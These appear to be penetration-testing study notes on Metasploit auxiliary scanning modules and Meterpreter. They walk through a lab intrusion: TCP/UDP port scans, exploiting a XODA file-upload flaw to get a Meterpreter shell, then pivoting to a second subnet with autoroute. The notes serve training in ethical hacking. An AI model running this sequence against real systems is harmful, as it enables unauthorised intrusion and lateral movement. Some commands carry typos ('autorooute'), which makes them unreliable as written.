## What is Auxiliary module
* Used to perform scanning, discovery and fuzzing.
* Auxiliary modules are used to perform both TCP and UDP port scanning
* Enumerate from services like FTP, SSH, HTTP, etc.
* Similar functionality to that of nmap --> but Auxiliary modules shine during post-exploitation phase.
* Once a system is discoverd with the open ports on it (This can be done through both nmpa and auxiliary modules).
* Discover hosts and perform port scanning on a different netwrok subnet can only be done through auxiliary modules.

## What is Meterpreter session
* Meterpreter is a post-exploitation tool often used within the Metasploit framework for penetration testing and ethical hacking purposes.
  
**PRACTICAL**
* `use auxiliary/scanner/portscan/tcp`
* The entire range of TCP ports is 1-65,535. So to scan entire range, ports option can be chnaged : `set ports 1-65535` {If you are not sure about the port on which the service is running}
* **CURL** --> Download the HTML of the web page 
  * `curl [target IP]`
  * `search xoda`
  * `use exploit/unix/webapp/xoda_file_upload`
  * `set rhosts` AND `set TargetURI /` --> set to the root.
  * `run` --> This will provide a meterpreter session on the target
 
* Inside that meterpreter session-->
* `shell`
* `ifconfig` --> To obtain the IP of other system connected on "eth1"
* The n come out of the shell and in meterpreter session execute: `run autorooute -s [IP of the other system on the network]`
    * "run": This is a command used within Meterpreter to execute various built-in scripts or functionalities.
    * "autoroute": This command within Meterpreter allows the attacker to add a route to the victim machine's routing table. It's used to route traffic for specific IP ranges or subnets through the compromised system.
    * "-s 192.45.240.3": The "-s" flag specifies the subnet or IP address that the traffic should be routed through the compromised system.
    * In this case, it's instructing Meterpreter to route traffic for the subnet 192.45.240.3 through the compromised machine.
 
* Again using portscan/tcp --> Scan this new system found on the network.

### Scan UDP ports
* `use auxiliary/scanner/discovery/udp_sweep`
* `set rhosts [IP]`
* `run`
